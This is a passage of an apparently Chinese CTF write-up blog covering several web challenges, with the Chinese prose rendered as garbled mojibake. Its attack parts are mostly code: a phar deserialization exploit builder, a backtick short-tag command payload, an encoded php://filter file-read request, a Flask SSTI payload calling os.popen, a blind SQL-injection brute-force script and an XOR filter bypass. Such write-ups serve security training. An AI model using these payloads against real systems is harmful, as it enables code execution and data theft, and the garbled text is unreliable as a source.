punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("ä¸Šä¼ æˆåŠŸ!");&lt;/script>'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">//echo "&lt;h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/>"; </span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">else</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–æ‰¾é“¾å­å¾ˆæ˜æ˜¾äº†</p><pre class="line-numbers language-none"><code class="language-none">C1e4r::__destruct-&gt;Show::__toString-&gt;Test::__get-&gt;Test::get-&gt;Test::file_get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ ååºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token comment">//ç›®æ ‡æ–‡ä»¶</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>  <span class="token comment">//è§¦å‘__get;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”Ÿæˆpharæ–‡ä»¶</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è§¦å‘ç±»æ˜¯C1e4rç±»</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"text.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç­¾å</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pharè®¿é—®å³å¯</p><h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;die(&#39;hacker!!!&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥</p><p>ç©ºæ ¼ï¼Œä¸‹åˆ’çº¿ï¼Œphpï¼Œåˆ†å·ï¼Œ~ï¼Œ^ï¼Œ+ï¼Œevalï¼ŒèŠ±æ‹¬å·</p><p>é¦–å…ˆæ˜¯phpæ ‡ç­¾ç»•è¿‡ï¼Œæœ‰çŸ­æ ‡ç­¾</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;&#96;å‘½ä»¤&#96;?&gt;&lt;?echo&quot;1&quot;?&gt;&lt;% echo&quot;1&quot;;%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ç¬¬ä¸€ä¸ªæ¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå°±æ˜¯ç©ºæ ¼ï¼Œç”¨åˆ¶è¡¨ç¬¦%09ä»£æ›¿ï¼Œæ ¹ç›®å½•è¯»å–å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token string single-quoted-string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘çœŸç»•ä¸è¿‡å»å•Šï¼Œwp</p><blockquote><p>jsonå­—ç¬¦è½¬è¯‘ï¼Œjsonä¼šå°†utf-8ç¼–ç çš„å­—ç¬¦è‡ªåŠ¨è½¬ä¸ºåŸå§‹å­—ç¬¦</p></blockquote><p>è¿™å°±å¥½åŠäº†ï¼Œç›´æ¥å°†æƒ³è¯»å–å†…å®¹ä¸­çš„flagè¿›è¡Œutf-8ç¼–ç å³å¯ï¼Œåˆå› ä¸ºä¸‹é¢å¯¹åŒ¹é…flagçš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–</p><pre class="line-numbers language-none"><code class="language-none">payload:POST&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>SSTIå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯è¿™ä¸ªä¼ å‚ä¸å¥½æ‰¾ï¼Œç”¨ä¸ªè„šæœ¬Arjunç”¨æ¥çˆ†å‚æ•°çš„</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;&#123;&#123;url_for.__globals__[&quot;os&quot;].popen(&#39;cat flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>è´´å¿ƒçš„æç¤ºï¼Œbançš„å¯çœŸå¤š</p><pre class="line-numbers language-none"><code class="language-none">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,Then you will get the flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€æœ‰çš„æ³¨é‡Šéƒ½æ²¡äº†ï¼ŒPHPç‰ˆæœ¬åˆ&lt;5.3.4ï¼Œä½¿ç”¨00æˆªæ–­æ¥è£åˆ‡åé¢è¯­å¥ï¼Œæ„é€ payload</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;\&amp;passwd&#x3D;||(passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^y&quot;);%00æ„é€ å‡ºçš„è¯­å¥å°±æ˜¯select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||(passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^w&quot;);%00&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurl<span class="token operator">=</span><span class="token string">"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php"</span>name<span class="token operator">=</span><span class="token string">"qwertyuiopasdfghjklzxcvbnm_&#125;&#123;0123456789"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> name<span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span>j        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'\\'</span><span class="token punctuation">,</span>            <span class="token string">'passwd'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"||(passwd/**/regexp/**/\"^</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">\");</span><span class="token interpolation"><span class="token punctuation">&#123;</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token punctuation">&#125;</span>        co<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code        <span class="token keyword">if</span> co<span class="token operator">==</span><span class="token number">404</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span>tmp            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#you_will_never_know7788990</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬æ‹¿åˆ°passwordï¼Œå†éšä¾¿å†™ä¸€ä¸ªé™¤adminä¹‹å¤–çš„userå°±è¡Œ</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/tmp_"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä»£ç ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬æ‰§è¡Œ<code>get_the_flag</code>å‡½æ•°å†ä¸Šä¼ æ–‡ä»¶getshell</p><p>é¦–å…ˆæ˜¯<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">æ­£åˆ™ç»•è¿‡</a>ï¼Œä½¿ç”¨å¼‚æˆ–ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag<span aria-hidden="true" 